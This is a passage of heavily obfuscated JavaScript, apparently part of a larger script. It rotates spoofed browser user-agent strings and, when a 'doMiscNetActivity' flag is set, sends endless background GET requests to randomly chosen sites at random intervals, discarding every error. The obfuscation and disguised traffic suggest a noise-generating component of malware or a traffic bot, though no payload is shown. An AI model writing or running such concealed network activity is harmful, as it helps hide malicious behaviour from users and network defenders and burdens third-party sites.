      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0x2467 + -0xc44 + 0x3 * 0x1039; k < 0x824 + 0xa9f + -0x12bf; k++)
    setTimeout(f, (0x133af + -0x3a1 * 0x5 + -0x2e * 0x133) * k * getRandomInt(0x3d6 * 0x8 + 0x4ee * -0x1 + 0x13 * -0x15b, 0xb * 0x374 + -0x7f5 + -0x1e04));
  setInterval(() => {
    f();
    for (let l = -0x33 * -0xad + 0x9 * -0x229 + -0x1 * 0xf06; l < -0x49 * 0x2f + -0x26fa * -0x1 + -0x198f; l++)
      setTimeout(f, (0x12b7a + 0x74b + 0x1 * -0x4865) * l * getRandomInt(0x1a7c + -0x2 * 0x1309 + 0xb97, -0x1d69 + 0x56 * 0x2e + 0xdf8));
  }, 0x46e816 + 0x2 * -0xa1f1a + 0x4449e);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x3566 + 0x311d + -0x4b2b) * getRandomInt(-0x2 * -0x108d + 0x10ad * 0x2 + -0x4273 * 0x1, 0x79 * -0x22 + -0x1054 + 0x206b));
}, -0x9f2 + -0x492 + -0x27c * -0x6);